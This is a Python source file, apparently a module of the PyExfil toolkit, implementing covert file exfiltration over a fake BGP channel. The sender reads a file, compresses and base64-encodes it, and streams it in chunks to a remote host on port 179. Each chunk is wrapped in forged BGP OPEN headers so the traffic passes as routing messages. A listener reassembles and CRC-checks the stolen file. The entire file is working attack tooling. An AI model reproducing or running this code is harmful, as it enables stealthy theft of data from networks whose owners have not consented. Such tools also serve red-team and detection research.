#!/usr/bin/env python3

import os
import sys
import time
import zlib
import socket
import base64

from pyexfil.includes.base import NetworkModule

# Constants
BINARY_WRITE = "wb"
BINARY_READ = "rb"
NULL = b"\x00"
COMP_LVL = 6
TRUE = 1

# BGP Constants
MSG_OPEN = b"\x01"
MSG_UPDATE = b"\x02"
MSG_NOTIFICATION = b"\x03"
MSG_KEEPALIVE = b"\x04"

BGP_PORT = 179
BGP_VER = b"\x04"

MIN_LENGTH_SIZE = b"\x00\x1d"
MAX_LENGTH_SIZE = 4096

MARKER = 16 * b"\xff"

# Temp constants for testing
AS_NUM = b"\xfe\x09"
HOLD_TIME = b"\x00\xb4"
BGP_IDENT = b"\xc0\xa8\x00\x0f"
MAGIC_2BYTE = b"\xc0\xa8"
MAGIC_BYTE = b"\x0f"

# Packet creation values
DELIMITER = b"\x12\x13\x14\x15"
INITIATOR = b"\x01\x02\x03\x04"
PACK_INIT = b"\x11\x11\x11\x11"
DATA_TERM = b"finfin"
CONN_TERM = b"kill_me_now"


def _create_bgp_packet():
    header = b""
    header += MARKER
    header += MIN_LENGTH_SIZE
    header += MSG_OPEN

    body = b""
    body += BGP_VER
    body += AS_NUM
    body += HOLD_TIME
    body += MAGIC_2BYTE + NULL + MAGIC_BYTE
    body += NULL

    return header + body


class BGPExfil(NetworkModule):
    MODULE_NAME = "BGP"
    PROTOCOL = "bgp/tcp"

    def __init__(self, host, port=BGP_PORT, enc_key="", packet_delay=0.1,
                 max_packet_size=MAX_LENGTH_SIZE, verbose=False):
        super().__init__(host=host, port=port, enc_key=enc_key,
                         packet_delay=packet_delay,
                         max_packet_size=max_packet_size, verbose=verbose)

    def _send_impl(self, data, **kwargs):
        path_to_file = data
        time_delay = kwargs.get("time_delay", self.packet_delay)

        try:
            with open(path_to_file, BINARY_READ) as fh:
                exfil_me = fh.read()
        except OSError as e:
            sys.stderr.write("Problem with reading file: %s\n" % e)
            return False

        checksum = zlib.crc32(exfil_me)
        head, tail = os.path.split(path_to_file)
        tail_bytes = tail.encode() if isinstance(tail, str) else tail

        exfil_me = zlib.compress(exfil_me, COMP_LVL)
        exfil_me = base64.b64encode(exfil_me)

        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))
        except OSError as e:
            sys.stderr.write("Could not open socket: %s\n" % e)
            return False

        bgp_packet = _create_bgp_packet()

        init_msg = (INITIATOR + DELIMITER + tail_bytes + DELIMITER
                    + str(checksum).encode() + DATA_TERM)
        sock.send(bgp_packet + init_msg)

        chunks = [exfil_me[i:i + self.max_packet_size]
                  for i in range(0, len(exfil_me), self.max_packet_size)]

        for chunk in chunks:
            msg = PACK_INIT + chunk + DATA_TERM
            try:
                sock.send(_create_bgp_packet() + msg)
            except OSError:
                try:
                    sock = socket.socket()
                    sock.connect((self.host, self.port))
                    sock.send(_create_bgp_packet() + msg)
                except OSError as e:
                    sys.stderr.write("Where did the server go: %s\n" % e)
                    return False
            time.sleep(time_delay)

        term_msg = _create_bgp_packet() + CONN_TERM + tail_bytes + DATA_TERM
        sock.send(term_msg)
        sock.close()
        return True

    def _listen_impl(self, callback, **kwargs):
        addr = kwargs.get("addr", self.host)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((addr, self.port))
            sys.stdout.write("Started listening at port %s at server %s\n"
                             % (self.port, addr))
        except OSError as e:
            sys.stderr.write("Error binding to local socket: %s\n" % e)
            return

        sock.listen(TRUE)

        while not self._stop_event.is_set():
            sys.stdout.write("Listening for connections.\n")
            connection, client_address = sock.accept()
            data_in_prog = False
            entire_raw_file = b""
            file_name = b""
            crc = b""

            try:
                while True:
                    data = connection.recv(4096)
                    if not data:
                        sys.stdout.write("No incoming data.\n")
                        break

                    if INITIATOR in data:
                        sys.stdout.write("Got incoming initiator from: %s\n"
                                         % str(client_address))
                        file_name_offset = data.find(DELIMITER) + len(DELIMITER)
                        remainder = data[file_name_offset:]
                        file_name = remainder[:remainder.find(DELIMITER)]
                        crc = remainder[remainder.find(DELIMITER) + len(DELIMITER):
                                        remainder.find(DATA_TERM)]
                        entire_raw_file = b""
                        data_in_prog = True

                    elif data_in_prog and CONN_TERM not in data and DATA_TERM in data:
                        chunk = data[data.find(PACK_INIT) + len(PACK_INIT):
                                     data.find(DATA_TERM)]
                        entire_raw_file += chunk

                    elif CONN_TERM in data:
                        try:
                            entire_raw_file = base64.b64decode(entire_raw_file)
                        except Exception as e:
                            sys.stderr.write("Error BASE64 decoding file: %s\n" % e)
                            break

                        try:
                            entire_raw_file = zlib.decompress(entire_raw_file)
                        except Exception as e:
                            sys.stderr.write("Error decompressing file: %s\n" % e)
                            break

                        computed_crc = str(zlib.crc32(entire_raw_file)).encode()
                        if computed_crc == crc:
                            sys.stdout.write("CRC matched!\n")
                            meta = {"addr": client_address, "file_name": file_name}
                            callback(entire_raw_file, meta)
                        else:
                            sys.stderr.write("CRC match failed!\n")
                        break
            finally:
                connection.close()


if __name__ == "__main__":
    sys.stdout.write(
        "This is meant to be a module for python and not a stand alone executable\n"
    )
